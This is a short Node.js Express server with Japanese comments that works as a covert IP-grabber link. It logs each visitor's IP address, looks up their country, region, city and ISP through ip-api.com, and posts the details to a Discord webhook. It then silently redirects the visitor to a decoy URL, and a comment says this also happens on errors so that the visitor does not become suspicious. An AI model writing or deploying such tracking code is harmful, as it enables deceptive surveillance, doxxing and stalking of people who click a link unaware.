const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Discord Webhook (Renderの環境変数から取得)
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// ★ ここに「開いた人を飛ばしたい先のURL」を入れる ★
const REDIRECT_URL = 'https://google.com'; 

app.set('trust proxy', true);

app.get('/', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.ip || '';
    let ip = rawIp.split(',')[0].trim();

    try {
        // IP情報を取得
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const geoData = await geoResponse.json();

        // Discordへのメッセージ組み立て
        let discordMessage = `🚨 **新しいアクセスを検知しました！**\nIPアドレス: \`${ip}\`\n`;
        
        if (geoData.status === 'success') {
            discordMessage += `国: ${geoData.country}\n地域: ${geoData.regionName}\n都市: ${geoData.city}\nプロバイダ: ${geoData.isp}`;
        } else {
            discordMessage += `位置情報の取得に失敗しました: ${geoData.message}`;
        }

        // Discordへ送信 (アクセスした人を待たせないように裏側で実行)
        if (DISCORD_WEBHOOK_URL) {
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: discordMessage })
            }).catch(err => console.error('Discord送信エラー:', err));
        }

        // ★ ブラウザを指定したURLへ強制的に飛ばす（リダイレクト） ★
        res.redirect(REDIRECT_URL);

    } catch (error) {
        console.error('❌ エラーが発生しました:', error.message);
        // 万が一エラーが起きても、怪しまれないようにとりあえず目的のサイトには飛ばしてあげる
        res.redirect(REDIRECT_URL);
    }
});

app.listen(PORT, () => {
    console.log(`サーバーが起動しました: http://localhost:${PORT}`);
});
